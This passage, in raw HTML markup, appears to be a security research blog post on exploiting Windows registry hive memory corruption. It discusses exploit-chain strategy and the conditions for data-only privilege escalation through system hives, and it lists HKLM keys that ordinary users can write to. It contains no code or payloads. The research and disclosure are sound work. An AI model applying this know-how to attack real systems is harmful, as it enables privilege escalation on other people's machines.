 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The exploitation of classic memory corruption bugs typically involves the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_hc7ktzssita9-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Initial memory corruption primitive&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;???&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;???&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;???&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Profit (in the form of arbitrary code execution, privilege escalation, etc.)&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6 ormwWEjHLs-c42&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The task of the exploit developer is to fill in the gaps in this list, devising the intermediate steps leading to the desired goal. There are usually several such intermediate steps because, given the current state of security and mitigations, vulnerabilities rarely lead directly from memory corruption to code execution in a single step. Instead, a &lt;/span&gt;&lt;span&gt;strategy of progressively developing stronger and stronger primitives is employed&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;, where the final chain might look like this, for instance:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLNPhQCEIJQwPAmHwGkk7aqreRRHqKBmZfFg9oz7Rs1NZhCekTv6ZOzf3Ol7eb3riI02g-Fp9dR-_DVq4WSn7Vzlc4P3QGlT9T6xINLbhUJIJ6IiTCPECl71N05nKL7ti7lU-4ZYpbfkRi0L66-9U9p47eUipaCUGuC-7C59QVpYUD5zD0NyxKcKfBSJo/s1348/image11.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLNPhQCEIJQwPAmHwGkk7aqreRRHqKBmZfFg9oz7Rs1NZhCekTv6ZOzf3Ol7eb3riI02g-Fp9dR-_DVq4WSn7Vzlc4P3QGlT9T6xINLbhUJIJ6IiTCPECl71N05nKL7ti7lU-4ZYpbfkRi0L66-9U9p47eUipaCUGuC-7C59QVpYUD5zD0NyxKcKfBSJo/s1200/image11.png&quot; border=&quot;0&quot; alt=&quot;A flowchart depicting exploit development strategy, starting with &amp;quot;Memory corruption&amp;quot; which leads to &amp;quot;Information leak&amp;quot;. This is followed by &amp;quot;Arbitrary vtable call&amp;quot;, then &amp;quot;ROP&amp;quot; (Return-Oriented Programming). &amp;quot;ROP&amp;quot; leads to &amp;quot;Allocation of executable payload&amp;quot;, which ultimately results in &amp;quot;Arbitrary code execution&amp;quot;.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart depicting exploit development strategy, starting with &amp;quot;Memory corruption&amp;quot; which leads to &amp;quot;Information leak&amp;quot;. This is followed by &amp;quot;Arbitrary vtable call&amp;quot;, then &amp;quot;ROP&amp;quot; (Return-Oriented Programming). &amp;quot;ROP&amp;quot; leads to &amp;quot;Allocation of executable payload&amp;quot;, which ultimately results in &amp;quot;Arbitrary code execution&amp;quot;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In this model, the second/third steps are achieved by finding another interesting object, arranging for it to be allocated near the overwritten buffer, and then corrupting it in such a way as to create a new primitive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, in the case of hives, our options in this regard seem limited: we assume that we can fully control the representation of any cell in the hive, but the problem is that there is no immediately interesting data in them from an exploitation point of view.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, the regf format does not contain any data that directly influences control flow (e.g., function pointers), nor any other addresses in virtual memory that could be overwritten in some clever way to improve the original primitive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The diagram below depicts our current situation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbx0Lsr6x06hUImY-R-iskaD7F8wGupF_1BdD-zhyphenhyphenV-YZrwW-WB23KUuywdXCdUGN4UCDxUFjEbqNBMxR-LMoUFxtRBCNkvsXou9x8ZbhEoxwabkI7Cmg0N_BqbBrL3TRSDvYUz247EE-F2wbC5LC_owez1WmajgyQ3YU4NdsTFgOM1k4COGvUjHITADc/s481/image16.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbx0Lsr6x06hUImY-R-iskaD7F8wGupF_1BdD-zhyphenhyphenV-YZrwW-WB23KUuywdXCdUGN4UCDxUFjEbqNBMxR-LMoUFxtRBCNkvsXou9x8ZbhEoxwabkI7Cmg0N_BqbBrL3TRSDvYUz247EE-F2wbC5LC_owez1WmajgyQ3YU4NdsTFgOM1k4COGvUjHITADc/s481/image16.png&quot; border=&quot;0&quot; alt=&quot;A diagram showing a box labeled &amp;quot;Hive memory corruption&amp;quot; with an arrow pointing to a second box with a dashed outline and a question mark inside, indicating an unknown next step resulting from hive memory corruption.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram showing a box labeled &amp;quot;Hive memory corruption&amp;quot; with an arrow pointing to a second box with a dashed outline and a question mark inside, indicating an unknown next step resulting from hive memory corruption.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Does this mean that hive memory corruption is non-exploitable, and the only thing it allows for is data corruption in an isolated hive memory view?&lt;/span&gt;&lt;span&gt;&amp;nbsp;Not quite&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the following subsections, we will carefully consider various ideas of how taking control of the internal hive data can have a broader impact on the overall security of the system.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Then, we will try to determine which of the available approaches is best suited for use in a real-world exploit.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.l78jin8yrcdz&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Intra-hive corruption&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Let&amp;#39;s start by investigating whether overwriting internal hive data is as impractical as it might initially seem.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.pbryskmjxgdj&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c27 ormwWEjHLs-c14&quot;&gt;Performing hive-only attacks in privileged system hives&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;To be clear, it&amp;#39;s not completely accurate to say that hives don&amp;#39;t contain any data worth overwriting.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If you think about it, it&amp;#39;s quite the opposite &amp;ndash; the registry stores a vast amount of system configuration, information about registered services, user passwords, and so on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The only issue is that all this critical data is located in specific hives, namely those mounted under HKEY_LOCAL_MACHINE, and some in HKEY_USERS (e.g., HKU\.Default, which corresponds to the private hive of the System user).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To be able to perform a successful attack and elevate privileges by corrupting only regf format data (without accessing other kernel memory or achieving arbitrary code execution), two conditions must be met:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_abtaez6amq7m-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span&gt;The vulnerability must be triggerable solely through API/system calls and must not require binary control over the hive, as we obviously don&amp;#39;t have that over any system hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;The target hive must contain at least one key with permissive enough access rights that allow unprivileged users to create values (KEY_SET_VALUE&lt;/span&gt;&lt;span&gt;&amp;nbsp;permission&lt;/span&gt;&lt;span&gt;) and/or new subkeys (KEY_CREATE_SUB_KEY)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;. Some other access rights might also be necessary, depending on the prerequisites of the specific bug.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Of the two points above, the first is definitely more difficult to satisfy.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Many hive memory corruption bugs result from a strange, unforeseen state in the hive structures that can only be generated &amp;quot;offline&amp;quot;, starting with full control over the given file.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;API-only vulnerabilities seem to be relatively rare: for instance, of my 17 hive-based memory corruption cases, less than half (specifically &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.g-issues.chromium.org/issues?q=CVE-2022-37956+OR+CVE-2023-21748+OR+CVE-2023-23420+OR+CVE-2023-23423+OR+CVE-2023-28248+OR+CVE-2023-35382+OR+CVE-2023-38139+OR+CVE-2024-43641&quot;&gt;8 of them&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) could theoretically be triggered solely by operations on an existing hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Furthermore&lt;/span&gt;&lt;span&gt;, a closer look reveals that some of them do not meet other conditions needed to target system hives (e.g., they only affect differencing hives), or are highly impractical, e.g., require the allocation of more than 500 GB of memory, or take many hours to trigger.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In reality, out of the wide range of vulnerabilities, there are really only two that would be well suited for directly attacking a system hive: &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(discussed in &lt;/span&gt;&lt;span&gt;the &amp;quot;Operating on subkeys of transactionally renamed keys&amp;quot; section of the report) &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451533&quot;&gt;CVE-2023-23423&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(discussed in &amp;quot;Freeing a shallow copy of a key node with CmpFreeKeyByCell&amp;quot;)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Regarding the second issue &amp;ndash; the availability of writable keys &amp;ndash; the situation is much better for the attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;There are three reasons for this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_8kp8wobudiou-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;To successfully carry out a data-only attack on a system key, we are usually not limited to one specific hive, but can choose any that suits us.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Exploiting hive corruption in most, if not all, hives mounted under HKLM would enable an attacker to elevate privileges.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;The Windows kernel internally implements the key opening process by first &lt;/span&gt;&lt;span&gt;doing &lt;/span&gt;&lt;span&gt;a full path lookup in the registry tree, and only then checking the required user permissions. The access check is performed solely on the security descriptor of the specific key, without considering its ancestors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This&lt;/span&gt;&lt;span&gt;&amp;nbsp;means that setting overly permissive security settings for a key automatically makes it vulnerable to attacks, as according to this logic, it receives no additional protection from its ancestor keys, &lt;/span&gt;&lt;span&gt;even if they have much stricter access controls&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;here are a large number of user-writable keys in &lt;/span&gt;&lt;span&gt;the HKLM\SOFTWARE and HKLM\SYSTEM hives&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;They do not exist in HKLM\BCD00000000, HKLM\SAM, or HKLM\SECURITY, but as I mentioned above, only one such key is sufficient for successful exploitation.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;To find specific examples of such publicly accessible keys, it is necessary to write custom tooling. This tooling should first recursively list all existing keys within the low-level \Registry\Machine and \Registry\User paths, while operating with the highest possible privileges, ideally as the System user. This will ensure that the process can see all the keys in the registry tree &amp;ndash; even those hidden behind restricted parents. It is not worth trying to enumerate the subkeys of \Registry\A, as any references to it are unconditionally blocked by the Windows kernel. Similarly, \Registry\WC can likely be skipped unless one is interested in attacking differencing hives used by containerized applications. Once we have a complete list of all the keys, the next step is to verify which of them are writable by unprivileged users. This can be accomplished either by reading their security descriptors (using &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetkeysecurity&quot;&gt;RegGetKeySecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) and manually checking their access rights (using &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-accesscheck&quot;&gt;AccessCheck&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;), or by delegating this task entirely to the kernel and simply trying to open every key with the desired rights while operating with regular user privileges. In either case, we should be ultimately able to obtain a list of potential keys that can be used to corrupt a system hive.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Based on my testing, there are approximately 1678 keys &lt;/span&gt;&lt;span&gt;within&lt;/span&gt;&lt;span&gt;&amp;nbsp;HKLM that grant subkey creation rights to normal users &lt;/span&gt;&lt;span&gt;on a current Windows 11 system&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Out of these, 1660 are located in HKLM\SOFTWARE, and 18 are in HKLM\SYSTEM.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Some examples include:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\CoreShell&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\DRM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Input\Locales&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(and&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;some&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;subkeys)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Input\Settings&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(and&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;some&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;subkeys)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Shell\Oobe&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Shell\Session&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Tracing &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(and&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;some&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;subkeys)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\Windows\UpdateApi&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\WOW6432Node\Microsoft\DRM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SYSTEM\Software\Microsoft\TIP&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(and&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;some&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;its&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;subkeys)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SYSTEM\ControlSet001\Control\Cryptography\WebSignIn\Navigation&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SYSTEM\ControlSet001\Control\MUI\StringCacheSettings&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SYSTEM\ControlSet001\Control\USB\AutomaticSurpriseRemoval&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HKLM\SYSTEM\ControlSet001\Services\BTAGService\Parameters\Settings&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As we can see, there are quite a few possibilities. The second key on the list, HKLM\SOFTWARE\Microsoft\DRM, has been somewhat popular in the past, as it was previously used by James Forshaw to demonstrate two vulnerabilities he discovered in 2019&amp;ndash;2020 (&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450862&quot;&gt;CVE-2019-0881&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451149&quot;&gt;CVE-2020-1377&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). Subsequently, I also used it as a way to trigger certain behaviors related to registry virtualization (&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451502&quot;&gt;CVE-2023-21675&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451527&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451589&quot;&gt;CVE-2023-35357&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), and as a potential avenue to fill the SOFTWARE hive to its capacity, thereby causing an OOM condition as part of exploiting another bug (&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451576&quot;&gt;CVE-2023-32019&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;). The main advantage of this key is that it exists in all modern versions of the system (since at least Windows 7), and it grants broad rights to all users (the Everyone group, also known as World, or S-1-1-0). The other keys mentioned above also allow regular users write operations, but they often do so through other, potentially more 